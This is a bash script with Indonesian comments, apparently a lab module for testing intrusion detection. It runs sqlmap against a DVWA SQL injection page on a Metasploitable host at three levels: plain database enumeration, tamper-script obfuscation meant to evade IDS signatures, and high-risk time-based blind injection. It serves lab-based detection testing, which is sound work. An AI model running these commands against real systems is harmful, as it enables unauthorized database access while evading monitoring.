#!/bin/bash

# =================================================================
# MODUL 04: SQL INJECTION (SQLMAP)
# Strategi: 3 Level Depth (Basic, Obfuscation, Time-Based)
# Target URL: DVWA (SQL Injection Page)
# =================================================================

# KONFIGURASI TARGET
TARGET_IP="192.168.1.XXX"   # Ganti dengan IP Metasploitable
# URL DVWA SQL Injection (Pastikan ID user ada, misal id=1)
TARGET_URL="http://$TARGET_IP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"

# PENTING: Ganti string ini dengan Cookie sesi login DVWA Anda!
# Cara dapat: Login DVWA -> F12 -> Storage -> Cookies -> PHPSESSID
COOKIE="security=low; PHPSESSID=ganti_dengan_session_id_anda"

LOG_FILE="logs/sqli_session_$(date +%F).log"

echo "[+] [04_SQLMAP] Memulai Modul SQL Injection..."
echo "[+] Target: $TARGET_URL"
echo "[+] Waktu Mulai: $(date)"


# Cek apakah Cookie sudah diganti?
if[[ "$COOKIE" == *"ganti_dengan"*]]; then
    echo "[!] WARNING: Anda belum mengganti PHPSESSID di script!"
    echo "[!] Script mungkin gagal login ke DVWA."
    sleep 3
fi

# -----------------------------------------------------------------
# LEVEL 1: NOISY / CLASSIC SQL INJECTION
# Tujuan: Menguji deteksi signature dasar (misal: ' OR 1=1).
# Teknik: --batch (otomatis jawab Y), tanpa teknik penyembunyian.
# -----------------------------------------------------------------
echo "[Level 1] Running Basic SQL Injection (--batch)..."
# -u: URL target
# --cookie: Autentikasi
# --batch: Jangan tanya user (otomatis Yes)
# --dbs: Enumerasi database (bukti sukses)
sqlmap -u "$TARGET_URL" --cookie="$COOKIE" --batch --dbs > logs/sqlmap_lvl1.txt 2>&1
echo "    -> Selesai. (Harapan: Alert ET WEB_SERVER SQL Injection)"
sleep 10

# -----------------------------------------------------------------
# LEVEL 2: EVASION / TAMPER SCRIPT
# Tujuan: Mengelabui IDS dengan mengacak payload (Obfuscation).
# Teknik: Menggunakan --tamper (space2comment, randomcase).
#         Contoh: 'UNION SELECT' menjadi 'UNIoN/**/SeLeCT'.
# -----------------------------------------------------------------
echo "[Level 2] Running Tamper Evasion (--tamper space2comment)..."
sqlmap -u "$TARGET_URL" --cookie="$COOKIE" --batch --tamper=space2comment,randomcase --dbs > logs/sqlmap_lvl2.txt 2>&1
echo "    -> Selesai. (Harapan: False Negative / Alert 'Evasion')"
sleep 10

# -----------------------------------------------------------------
# LEVEL 3: TIME-BASED BLIND & HIGH RISK
# Tujuan: Menguji deteksi anomali waktu (bukan signature text).
# Teknik: --technique=T (Time-Based). Payload membuat database 'tidur'.
#         --level=5 --risk=3 (Mengirim payload sangat banyak & berbahaya).
# -----------------------------------------------------------------
echo "[Level 3] Running Time-Based Blind (--technique=T --level=5)..."
# Teknik ini tidak berisik di log text, tapi membuat respon server lambat.
sqlmap -u "$TARGET_URL" --cookie="$COOKIE" --batch --technique=T --level=5 --risk=3 --dbs > logs/sqlmap_lvl3.txt 2>&1
echo "    -> Selesai. (Harapan: Deteksi via flow/timeout analysis)"

echo "[+] [04_SQLMAP] Modul Selesai pada $(date)"
echo "-----------------------------------------------------------"
